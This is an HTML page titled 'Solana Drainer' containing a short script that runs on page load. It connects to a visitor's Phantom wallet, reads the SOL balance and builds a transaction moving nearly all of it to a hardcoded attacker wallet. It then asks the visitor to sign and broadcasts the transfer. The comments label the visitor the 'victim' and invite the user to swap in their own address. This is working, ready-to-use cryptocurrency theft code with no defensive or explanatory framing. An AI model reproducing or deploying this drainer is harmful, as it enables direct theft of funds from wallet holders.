<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Drainer</title>
</head>
<body>
    <h1>Draining Solana</h1>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.30.2"></script>
    <script>
        (async () => {
            console.log("üîç Checking for Phantom Wallet...");

            // Checking for Phantom Wallet
            const provider = window.solana;
            if (!provider || !provider.isPhantom) {
                console.log("üö® Phantom Wallet not detected! Make sure it's installed and unlocked.");
                alert("Phantom Wallet not detected!");
                return;
            }

            console.log("‚úÖ Phantom Wallet detected!");

            // Connect to Phantom Wallet
            await provider.connect(); 

            // Get connection to Solana network
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");

            // Attackers Wallet Address (replace with your address)
            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh");

            // Get the public key of the connected wallet
            const userWallet = provider.publicKey;
            console.log(`üí∞ Victim Address: ${userWallet.toBase58()}`);

            // Get the balance of the victim's wallet
            let balance = await connection.getBalance(userWallet);
            let drainAmount = balance - 5000; // Leaves a small fee to prevent failure

            // Only drain if the balance is more than 0
            if (drainAmount > 0) {
                let transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userWallet,
                        toPubkey: attackerWallet,
                        lamports: drainAmount
                    })
                );

                console.log(`‚ö†Ô∏è Draining ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);

                // Sign and send the transaction
                const signedTransaction = await provider.signTransaction(transaction);
                await connection.sendRawTransaction(signedTransaction.serialize());

                console.log("‚úÖ SOL Drain complete. Check your wallet.");
            } else {
                console.log("‚ùå No SOL to drain.");
            }
        })();
    </script>
</body>
</html>
